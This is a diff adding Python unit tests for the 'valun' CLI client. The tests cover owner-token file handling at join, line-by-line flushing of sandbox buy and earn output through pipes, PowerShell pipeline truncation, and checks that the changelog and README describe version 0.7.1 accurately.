+        """The join's later steps ran (the agent's key saved, the mandate set, its last lines printed), and status,
+        doctor and console printed theirs: no command carries an escape, and the paths' characters are printed as
+        their code page has them or as \\u escapes."""
+        with open(os.path.join(self.uhome, 'profiles', 's.json'), encoding='utf-8') as f:
+            disk = json.load(f)
+        self.assertEqual((disk['participant_id'], bool(disk.get('secret')), disk['approvals']), (S_ID, True, 'none'))
+        self.assertEqual(puts, 1, 'the mandate was set')
+        self.assertEqual(len(rcs), 4, out)
+        self.assertEqual((rcs[1], rcs[3]), (0, 0), out)
+        self.assertIn(rcs[2], (0, 1), out)
+        self.assertIn('Credentials are stored privately in ', out)
+        self.assertIn('Next: run `valun --profile s doctor`', out)
+        self.assertIn('participant: ', out)                         # status
+        self.assertIn('profiles in ', out)                          # doctor
+        self.assertIn('Owner console: ', out)                       # console
+        self.assertTrue('\\u540d\\u524d' in out or '名前' in out, out)
+        for cmd in re.findall(r'`([^`]*)`', out):
+            self.assertNotIn('\\u', cmd, 'a printed command never carries an escape')
+
+    def test_the_default_file_written(self):
+        rcs, puts, out, err = self.join()
+        self.assertEqual(rcs[0], 0, out + err)
+        self.assertIn('Your OWNER token is in ', out)
+        self.assertNotIn('vpo_test-only', out)
+        with open(os.path.join(self.uhome, 'valun-owner-token-stranger.txt'), encoding='utf-8') as f:
+            self.assertEqual(f.read(), 'vpo_test-only\n')
+        self.finished(rcs, puts, out)
+
+    def refused(self, *extra):
+        """The join alone, refused before anything was sent (exit 2), its paths printed as the code page has them."""
+        rcs, puts, out, err = self.piped(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--approvals',
+                                          'none', '--server', SERVER, *extra])
+        self.assertEqual((rcs, puts), ([2], 0), out + err)
+        self.assertTrue(out.startswith('Nothing was sent: '), out)
+        self.assertNotIn('vpo_', out + err)
+        self.assertTrue('\\u540d\\u524d' in out or '名前' in out, out)
+        return out
+
+    def test_a_file_there_already_is_refused_before_anything_is_sent(self):
+        with open(os.path.join(self.uhome, 'valun-owner-token-stranger.txt'), 'w', encoding='utf-8') as f:
+            f.write('vpo_another-identity\n')
+        self.assertIn('exists already (join writes your owner token there when no --owner-token-file is given)',
+                      self.refused())
+
+    def test_a_file_in_a_missing_folder_is_refused_before_anything_is_sent(self):
+        missing = os.path.join(self.uhome, 'no folder 名', 'owner.txt')     # its folder is not there
+        self.assertIn('does not exist, so your owner token could not be written there', self.refused('--owner-token-file', missing))
+
+    def test_an_ascii_owner_token_file_with_the_profile_under_the_home(self):
+        ascii_file = os.path.join(self.tmp.name, 'ascii', 'owner.txt')
+        os.makedirs(os.path.dirname(ascii_file))
+        rcs, puts, out, err = self.join('--owner-token-file', ascii_file)
+        self.assertEqual(rcs[0], 0, out + err)
+        self.assertIn(f'Your OWNER token is in {ascii_file}.', out)
+        self.finished(rcs, puts, out)
+
+    def test_a_command_names_a_file_it_cannot_print_apart(self):
+        # Console approvals (join --sandbox's default) print the command that changes them, with the owner token file
+        rcs, puts, out, err = self.piped(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--server',
+                                          SERVER])
+        self.assertEqual(rcs, [0], out + err)
+        if '名前' not in out:                    # the code page lacks it: FILE, and what FILE is
+            self.assertIn('config approvals MODE --owner-token-file FILE` (MODE: ask, client-prompt or none; FILE: the '
+                          'file holding your owner token).', out)
+        for cmd in re.findall(r'`([^`]*)`', out):
+            self.assertNotIn('\\u', cmd)
+
+
+# `valun sandbox buy` or `earn` in a child process whose stdout is a pipe, as a shell agent runs it: the Valun client is
+# a stand-in whose deal() waits, at WAIT, until the test writes a line to the child's stdin (the owner approving in the
+# console), so the test can see which lines arrived while the command still waits.
+PIPED_CHILD = r'''
+import json, os, sys, types
+sys.path.insert(0, {src!r})
+from unittest import mock
+from valun import cli, sandbox as sb
+views = iter({views!r})
+
+
+def deal(did):
+    v = next(views)
+    if v == 'WAIT':
+        sys.stdin.readline()
+        v = next(views)
+    return {{'status': v}}
+
+
+stub = types.SimpleNamespace(state={{'server': {server!r}}}, participant_id='vp_0a0a0a0a0a0a', unit='nanoERG', network=None,
+                             directory=lambda: [{{'id': 'vp_0b0b0b0b0b0b', 'handle': 'sandbox-exact'}}], inbox=lambda: {{}},
+                             propose=lambda *a: {{'id': 'vd_0123456789abcdef', 'status': 'proposed_awaiting_owner'}},
+                             deal=deal)
+with mock.patch.object(sb.vc, 'Client', lambda store, server=None: stub), mock.patch.object(sb.time, 'sleep', lambda s: None):
+    sys.exit(cli.main({argv!r}))
+'''
+
+
+class PipedLines(unittest.TestCase):
+    """The RC's staging test (2026-11-18), problem 2: `valun sandbox earn` and `buy` printed without flushing, so an agent
+    reading their output through a pipe saw "your offer waits for you in the owner console" only when the command ended
+    (7 lines at once, after the owner had approved). Each line is now flushed as it is printed, as the tour's are."""
+    WAITS = 'your offer waits for you in the owner console (http://127.0.0.1:9/pilot#owner): approve it there'
+
+    def run_piped(self, argv, views):
+        import queue
+        import subprocess
+        import threading
+        import time
+        home = tempfile.TemporaryDirectory()
+        self.addCleanup(home.cleanup)
+        os.makedirs(os.path.join(home.name, 'profiles'))
+        with open(os.path.join(home.name, 'profiles', 'default.json'), 'w', encoding='utf-8') as f:
+            json.dump({'server': 'http://127.0.0.1:9', 'participant_id': 'vp_0a0a0a0a0a0a', 'network': 'valun-testnet-1',
+                       'secret': '11' * 32, 'agent_token': 'vpa_TEST-ONLY-piped', 'approvals': 'console'}, f)
+        env = {k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))}
+        env.update(VALUN_HOME=home.name, PYTHONIOENCODING='utf-8')        # never PYTHONUNBUFFERED: a pipe as an agent's
+        code = PIPED_CHILD.format(src=os.path.join(os.path.dirname(HERE), 'src'), views=list(views),
+                                  server='http://127.0.0.1:9', argv=list(argv))
+        p = subprocess.Popen([sys.executable, '-c', code], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, env=env, cwd=home.name)
+        self.addCleanup(p.kill)
+        lines = queue.Queue()
+
+        def read():
+            for x in p.stdout:
+                lines.put(x.decode('utf-8', 'replace').rstrip())
+            lines.put(None)                     # the end of its output
+        threading.Thread(target=read, daemon=True).start()
+        early, end = [], time.monotonic() + 20
+        while not any(self.WAITS in x for x in early) and time.monotonic() < end:
+            try:
+                x = lines.get(timeout=max(0.01, end - time.monotonic()))
+            except queue.Empty:
+                break
+            if x is None:
+                break
+            early.append(x)
+        waiting = p.poll() is None              # the child still waits in deal(): the owner has not approved yet
+        with contextlib.suppress(OSError):      # a child that ended already reads nothing
+            p.stdin.write(b'approved\n')
+            p.stdin.close()
+        rc = p.wait(30)
+        later = []
+        with contextlib.suppress(queue.Empty):
+            while (x := lines.get(timeout=30)) is not None:
+                later.append(x)
+        p.stdout.close()
+        return early, waiting, rc, later
+
+    def test_sandbox_buy_and_earn_print_each_line_while_they_wait(self):
+        for argv, views in ((['sandbox', 'buy', 'sandbox-exact', 'text-stats', '--text', 'hi'], ['WAIT', 'rejected_by_owner']),
+                            (['sandbox', 'earn'], ['proposed_awaiting_owner', 'WAIT', 'declined'])):
+            early, waiting, rc, later = self.run_piped(argv, views)
+            self.assertTrue(waiting, (argv, early))
+            self.assertTrue(any(self.WAITS in x for x in early),
+                            f'{argv[1]}: the waiting line did not arrive while the command waited: {early}')
+            self.assertTrue(early[0].startswith('offered '), early)
+            self.assertEqual(rc, 1, later)
+            self.assertTrue(later and later[-1].startswith('{"deal_id": "vd_0123456789abcdef"'), later)
+
+    def test_a_reader_that_goes_away_stops_nothing(self):
+        # The RC's review (R2-OTHER-5): once each line was flushed, a reader that left early (`| head -n 1`) made the next
+        # line raise OSError, and its traceback stopped buy or earn mid-deal (0.7.1's buffered print finished every step).
+        import subprocess
+        home = tempfile.TemporaryDirectory()
+        self.addCleanup(home.cleanup)
+        os.makedirs(os.path.join(home.name, 'profiles'))
+        with open(os.path.join(home.name, 'profiles', 'default.json'), 'w', encoding='utf-8') as f:
+            json.dump({'server': 'http://127.0.0.1:9', 'participant_id': 'vp_0a0a0a0a0a0a', 'network': 'valun-testnet-1',
+                       'secret': '11' * 32, 'agent_token': 'vpa_TEST-ONLY-piped', 'approvals': 'console'}, f)
+        env = {k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))}
+        env.update(VALUN_HOME=home.name, PYTHONIOENCODING='utf-8')
+        code = PIPED_CHILD.format(src=os.path.join(os.path.dirname(HERE), 'src'), views=['WAIT', 'rejected_by_owner'],
+                                  server='http://127.0.0.1:9', argv=['sandbox', 'buy', 'sandbox-exact', 'text-stats',
+                                                                     '--text', 'hi'])
+        code = code.replace('    sys.exit(cli.main(', '    rc = cli.main(').replace("'hi']))", "'hi'])\n    open('done.txt', 'w')"
+                                                                                       ".write(str(rc))\n    sys.exit(rc)")
+        p = subprocess.Popen([sys.executable, '-c', code], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                             stderr=subprocess.PIPE, env=env, cwd=home.name)
+        self.addCleanup(p.kill)
+        first = p.stdout.readline()
+        self.assertTrue(first.startswith(b'offered '), first)
+        p.stdout.close()                        # the reader goes away, as `head -n 1` does
+        p.stdin.write(b'approved\n')
+        p.stdin.close()
+        rc = p.wait(30)
+        err = p.stderr.read().decode('utf-8', 'replace')
+        p.stderr.close()
+        self.assertNotIn('Traceback', err)
+        self.assertEqual(rc, 1, err)            # as when the output is read whole: the owner rejected the offer
+        with open(os.path.join(home.name, 'done.txt'), encoding='utf-8') as f:
+            self.assertEqual(f.read(), '1', 'buy ended as it does, every step done')
+
+    def test_powershells_select_object_stops_the_deal_and_the_docs_say_so(self):
+        # The RC's review, round 3 (regressions R3-REG-2): Windows PowerShell's `| Select-Object -First N` ends the native
+        # command once it has N lines, so with each line flushed (c0bcae5) `sandbox buy` stopped after the offer was
+        # signed and sent, before the delivery was verified or paid (0.7.1 printed nothing until it ended, so the same
+        # pipeline ran every step). _line_now's docstring said that "stops nothing". Nothing can keep a process that is
+        # ended so: the README and the CHANGELOG say so, and how to keep part of the output instead.
+        import shutil
+        import subprocess
+        import time
+        root = os.path.dirname(os.path.dirname(HERE))
+        with open(os.path.join(root, 'python', 'README.md'), encoding='utf-8') as f:
+            readme = ' '.join(f.read().split())
+        with open(os.path.join(root, 'CHANGELOG.md'), encoding='utf-8') as f:
+            changelog = ' '.join(f.read().split())
+        for text in (readme, changelog):
+            self.assertIn("Windows PowerShell's `| Select-Object -First N`", text)
+            self.assertIn('`valun call valun_inbox`', text)
+        self.assertIn('> earn.txt', readme)
+        self.assertNotIn('Select-Object -First 3) stops nothing', ' '.join(cli._line_now.__doc__.split()))
+        ps = shutil.which('powershell') if os.name == 'nt' else None
+        if ps is None:
+            return                              # no Windows PowerShell here: the docs are checked above
+        home = tempfile.TemporaryDirectory()
+        self.addCleanup(home.cleanup)
+        calls = os.path.join(home.name, 'calls.txt')
+        child = os.path.join(home.name, 'buy_child.py')
+        with open(child, 'w', encoding='utf-8') as f:
+            f.write(SLOW_BUY.format(src=os.path.join(os.path.dirname(HERE), 'src'), home=home.name, calls=calls))
+        script = f"& '{sys.executable}' '{child}' | Select-Object -First 1"
+        import base64
+        p = subprocess.run([ps, '-NoProfile', '-NonInteractive', '-EncodedCommand',
+                            base64.b64encode(script.encode('utf-16-le')).decode('ascii')], capture_output=True, timeout=120,
+                           env={k: v for k, v in os.environ.items() if not k.upper().startswith(('VALUN_', 'PYTHON'))})
+        self.assertTrue(p.stdout.decode('utf-8', 'replace').startswith('offered '), p.stdout)
+        time.sleep(6)                           # more than the rest of the deal (3 reads of 1.5 s) would take, had it gone on
+        with open(calls, encoding='utf-8') as f:
+            done = f.read().splitlines()
+        self.assertEqual(done[0], 'propose', done)
+        self.assertNotIn('complete', done, 'PowerShell ended it before the delivery was verified and paid')
+
+
+# `valun sandbox buy` against a stand-in Client whose reads take a moment each, recording each call in a file (what was
+# done is known after the reader of stdout has gone)
+SLOW_BUY = r'''
+import json, os, sys, threading, types
+sys.path.insert(0, {src!r})
+os.environ['VALUN_HOME'] = {home!r}
+os.makedirs(os.path.join({home!r}, 'profiles'), exist_ok=True)
+with open(os.path.join({home!r}, 'profiles', 'default.json'), 'w', encoding='utf-8') as f:
+    json.dump({{'server': 'http://127.0.0.1:9', 'participant_id': 'vp_0a0a0a0a0a0a', 'network': 'valun-testnet-1',
+               'secret': '11' * 32, 'agent_token': 'vpa_TEST-ONLY-piped', 'approvals': 'none'}}, f)
+from unittest import mock
+from valun import cli, sandbox as sb
+
+
+def rec(x):
+    with open({calls!r}, 'a', encoding='utf-8') as f:
+        f.write(x + chr(10))
+
+
+content = sb.render('text-stats', sb.COMPUTE['text-stats']('hi'), 'hi')
+views = iter([{{'status': 'accepted'}}, {{'status': 'agreed'}},
+              {{'status': 'delivered', 'delivery': {{'content': content, 'sha256': 'ab' * 32}}}}])
+
+
+def deal(did):
+    threading.Event().wait(1.5)                 # a server's answer takes a moment: PowerShell ends the deal meanwhile
+    v = next(views)
+    rec('read ' + v['status'])
+    return v
+
+
+def propose(*a):
+    rec('propose')
+    return {{'id': 'vd_0123456789abcdef', 'status': 'proposed'}}
+
+
+def complete(did, sha):
+    rec('complete')
+    return {{'status': 'note_issued'}}
+
+
+stub = types.SimpleNamespace(state={{'server': 'http://127.0.0.1:9'}}, participant_id='vp_0a0a0a0a0a0a', unit='nanoERG',
+                             network=None, directory=lambda: [{{'id': 'vp_0b0b0b0b0b0b', 'handle': 'sandbox-exact'}}],
+                             propose=propose, deal=deal, complete=complete)
+with mock.patch.object(sb.vc, 'Client', lambda store, server=None: stub), mock.patch.object(sb.time, 'sleep', lambda s: None):
+    rc = cli.main(['sandbox', 'buy', 'sandbox-exact', 'text-stats', '--text', 'hi'])
+rec(f'returned {{rc}}')
+sys.exit(rc)
+'''
+
+
+class WhatTheNotesSayOf071(unittest.TestCase):
+    """The RC's review, round 3 (regressions R4-REG-4): three statements about 0.7.1 were wrong. For a profiles folder
+    this user may not open, the CHANGELOG said 0.7.1's doctor said "no profile file yet", which is this release's own
+    wording (0.7.1 called the missing profile private, said "Approvals: ask" and gave "Not connected" with a join); it
+    listed `valun console`, which 0.7.1 does not have, among what failed on a code-page stdout; and python/README.md said
+    0.7.1 printed nothing until the end after a block that lists the tour, which 0.7.1 printed line by line already
+    (only sandbox earn and buy did not)."""
+
+    def read(self, *parts):
+        root = os.path.dirname(os.path.dirname(HERE))
+        with open(os.path.join(root, *parts), encoding='utf-8') as f:
+            return ' '.join(f.read().split())
+
+    def test_the_changelog_and_the_readme_say_what_0_7_1_did(self):
+        changelog = self.read('CHANGELOG.md')
+        notes = changelog[changelog.index('## 0.7.2'):changelog.index('## 0.7.1')]
+        self.assertNotIn('so doctor said "no profile file yet" and "Not connected"', notes)
+        self.assertIn("so 0.7.1's doctor called it private and said \"Approvals: ask\" and \"Not connected\" with a join, "
+                      'status "(not joined)" and "approvals: ask"', notes)
+        self.assertNotIn('doctor, status and console at the lines that name the profile', notes)
+        self.assertIn('and doctor and status at the lines that name the profile or its folder', notes)
+        readme = self.read('python', 'README.md')
+        self.assertNotIn('(valun 0.7.1 printed nothing until the command ended, so it ran on.)', readme)
+        self.assertIn("(valun 0.7.1's `sandbox earn` and `buy` printed nothing until they ended, so they ran on; its tour "
+                      'printed each line as it happened already.)', readme)
 
 
 if __name__ == '__main__':
